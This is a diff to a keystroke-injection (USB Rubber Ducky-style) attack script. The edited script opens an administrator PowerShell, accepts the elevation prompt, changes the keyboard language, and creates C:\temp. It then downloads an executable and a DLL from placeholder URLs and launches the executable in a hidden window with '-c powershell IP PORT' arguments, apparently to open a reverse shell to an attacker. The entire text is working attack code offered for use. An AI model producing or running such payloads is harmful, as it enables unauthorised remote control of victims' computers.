@@ -3,14 +3,25 @@ GUI r
 DELAY 1000
 STRING powershell Start-Process powershell -Verb runAs
 ENTER
-DELAY 1000  
+DELAY 3000
+ALT o
+DELAY 2000
+STRING Set-WinUserLanguageList -LanguageList en-US, ru -Force
+ENTER
+DELAY 750
+STRING New-Item -ItemType directory -Path C:\temp
+ENTER
+DELAY 750
 STRING cd C:\temp
 ENTER
 DELAY 750
-STRING Invoke-WebRequest -Uri <FILE URL> -OutFile <OUTPUT FILE>
+STRING Invoke-WebRequest -Uri <FILE> -OutFile <FILE>
 ENTER
-DELAY 750
-STRING Start-Process C:\temp\<OUTPUT FILE> -ArgumentList "<OPTIONAL>" -WindowStyle hidden
+DELAY 2000
+STRING Invoke-WebRequest -Uri <FILE> -OutFile <FILE.dll>
+ENTER
+DELAY 2000
+STRING Start-Process C:\temp\s<FILE> -ArgumentList '-c powershell IP PORT' -WindowStyle hidden
 ENTER
 DELAY 750
 STRING exit
